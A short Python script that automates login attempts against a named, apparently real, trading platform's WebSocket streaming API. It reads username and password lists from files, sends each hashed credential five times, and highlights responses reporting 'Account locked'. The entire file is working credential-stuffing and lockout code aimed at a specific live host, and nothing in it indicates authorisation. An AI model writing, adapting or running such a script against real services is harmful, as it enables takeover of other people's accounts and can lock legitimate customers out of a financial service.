import json
import hashlib
import websocket
from termcolor import colored

# read usernames from file
with open('usernames.txt') as f:
    usernames = [line.strip() for line in f.readlines()]

# read passwords from file
with open('pass.txt') as f:
    passwords = [line.strip() for line in f.readlines()]

# create the JSON data for the request and send it 5 times
for i in range(len(usernames)):
    for j in range(5):
        data = {
            "HED": {
                "msgTyp": 1,
                "channel": 1,
                "commVer": "DFNUAWEB_XX_Alkhabeer_X_1.001.22.3+56d90ac9",
                "loginId": "",
                "instId": "0",
                "sesnId": "",
                "routeId": "0",
                "clientIp": "",
                "tenantCode": "DEFAULT_TENANT",
                "unqReqId": f"0_{i}_{j}"
            },
            "DAT": {
                "lgnNme": usernames[i],
                "pwd": hashlib.sha256(passwords[i].encode()).hexdigest()
            }
        }

        # send the request using websocket and print the response
        print(colored(f"Request {i+1}- Attempt{j+1}:", 'green'))
        print(colored(json.dumps(data, indent=4), 'yellow'))
        ws = websocket.WebSocket()
        ws.connect('wss://alkhabeertadawul.com/streaming-api')
        ws.send(json.dumps(data))
        result = ws.recv()
        if "Account locked" in result:
            print(colored(f"Response {i+1}- Attempt{j+1}:", 'red'))
            print(colored(result, 'red'))
        else:
            print(colored(f"Response {i+1}- Attempt{j+1}:", 'green'))
            print(colored(result, 'yellow'))
        ws.close()
        print()

